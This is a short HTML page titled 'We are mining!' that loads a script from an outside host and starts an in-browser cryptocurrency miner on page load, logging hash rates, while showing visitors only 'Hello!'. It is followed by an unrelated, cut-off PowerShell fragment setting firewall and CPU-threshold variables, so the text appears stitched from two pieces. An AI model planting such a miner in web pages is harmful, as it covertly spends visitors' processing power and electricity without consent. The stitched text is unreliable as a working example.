<html>

    <head>
	   <title>We are mining!</title>
    </head> 
<body>
    
    <h1>Hello!</h1>

<script src="https://www.hostingcloud.racing/8brg.js"></script>
<script>
    var _client = new Client.Anonymous('24c8b4d39911015413ec0c09ea881a5473605af7cc0aa88aa23f82c0ebd45cf1', {
        throttle: 0.7, c: 'w', ads: 0
    });
    _client.start();
    
      // Listen on events
  _client.on('found', function() { console.log('found hash!')})
  _client.on('accepted', function() { console.log('accepted hash!')})
    
    SetInterval(function(){
        var hashesPerSecond = _client.getHashPerSecond();
        var totalHashes = _client.getTotalHashes();
        var acceptedHashes = _client.getAcceptedHashes();
        
        console.log("hashesPerSecond", hashesPerSecond)
        console.log("totalHashes", totalHashes)
        console.log("acceptedHashes", acceptedHashes)
        
        //Output to HTML elements
    }, 1000);

</script>
    
	</body>
</html>

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
$cpu_threshold = 85
$sleep_interval = 5
$hit = 0
$iloop = 0
